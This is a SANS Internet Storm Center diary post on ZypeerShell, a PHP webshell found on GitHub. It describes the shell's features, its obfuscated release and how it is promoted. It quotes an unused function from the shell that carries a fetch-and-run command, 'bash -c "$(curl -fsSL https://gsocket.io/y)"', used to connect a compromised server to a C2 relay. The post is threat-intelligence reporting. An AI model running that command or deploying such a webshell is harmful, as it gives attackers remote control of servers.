---
title: Webshells Remain Popular, (Mon, Jun 22nd)
url: https://isc.sans.edu/diary/rss/33096
source: SANS Internet Storm Center, InfoCON: green
date: 2026-06-22
fetch_date: 2026-06-23T06:08:14.302041
---

# Webshells Remain Popular, (Mon, Jun 22nd)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Manuel Humberto Santander Pelaez](/handler_list.html#manuel-humberto-santander-pelaez "Manuel Humberto Santander Pelaez")

Threat Level: [green](/infocon.html)

* [previous](/diary/33094)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

# [Webshells Remain Popular](/forums/diary/Webshells%2BRemain%2BPopular/33096/)

**Published**: 2026-06-22. **Last Updated**: 2026-06-22 14:10:27 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Webshells%2BRemain%2BPopular/33096/#comments)

Webshells have been popular for a long time. We already covered this topic across multiple diaries[[1](https://isc.sans.edu/diary/Webshells%2BWebshells%2Beverywhere/28106)][[2](https://isc.sans.edu/diary/Webshell%2Blooking%2Bfor%2Binteresting%2Bfiles/23567)]. I spent some time to track them[[3](https://owasp.org/www-chapter-belgium/assets/2017/2017-05-29/2017-05-29_OWASP-BE_HTTPForTheGoodOrTheBad.pdf)] and slighly paid less attention to them but today I found another one. It seems to be a new player (pushed on Github two months ago).

The webshell is called ZypeerShell[[4](https://github.com/sagsooz/ZypeerShell)] and pretend to be "The most powerful, undetectable, and feature-rich PHP webshell available on GitHub.". The shell is classic and provides most of the expected features for such tool:

![](https://isc.sans.edu/diaryimages/images/isc-20260622-1.png)

I won't review all the features because they are classic. In the webshell version I found, some functions were present but never called from the GUI. By example, the function zypeergsdeploy() helps to connect to a C2 server through GSocket

```

function zypeergsdeploy() {
    zypeerhead();

    echo '<div class="header"><center><p><div class="txtfont_header">| GSocket Deploy Tool |</div></p></center><br>';

    echo '<div style="text-align:center;max-width:800px;margin:20px auto;color:#ccc;">';
    echo 'This tool runs the official GSocket installation command:<br>';
    echo '<code style="background:#222;padding:8px 12px;font-size:15px;">bash -c "$(curl -fsSL https://gsocket.io/y)"</code><br><br>';
    echo 'After installation, it will show a secret token and connection command (like gs-netcat -s "XXXX" -i).<br>';
    echo 'Click "Run" below to execute it directly.';
    echo '</div><br><hr><br>';

    if (!isset($_POST['zypeer3']) || $_POST['zypeer3'] !== '>>') {
    [...]
```

This function is never called!

Note that the Github repository contains a version obfusctated with Fortress Layer, a multi-layer loader with integrity checks. Zypeer is also referenced as a red-team tool on a Telegram channel:

![](https://isc.sans.edu/diaryimages/images/isc-20260622-2.png)???????

[1] [https://isc.sans.edu/diary/Webshells+Webshells+everywhere/28106](https://isc.sans.edu/diary/Webshells%2BWebshells%2Beverywhere/28106)
[2] [https://isc.sans.edu/diary/Webshell+looking+for+interesting+files/23567](https://isc.sans.edu/diary/Webshell%2Blooking%2Bfor%2Binteresting%2Bfiles/23567)
[3] [https://owasp.org/www-chapter-belgium/assets/2017/2017-05-29/2017-05-29\_OWASP-BE\_HTTPForTheGoodOrTheBad.pdf???????](https://owasp.org/www-chapter-belgium/assets/2017/2017-05-29/2017-05-29_OWASP-BE_HTTPForTheGoodOrTheBad.pdf)
[4] [https://github.com/sagsooz/ZypeerShell???????](https://github.com/sagsooz/ZypeerShell)

**Xavier Mertens (@xme)**
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://raw.githubusercontent.com/xme/pgp/refs/heads/main/public.key)

Keywords: [Webshell](/tag.html?tag=Webshell) [Zypeer](/tag.html?tag=Zypeer)

[0 comment(s)](/diary/Webshells%2BRemain%2BPopular/33096/#comments)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

* [previous](/diary/33094)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2026 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)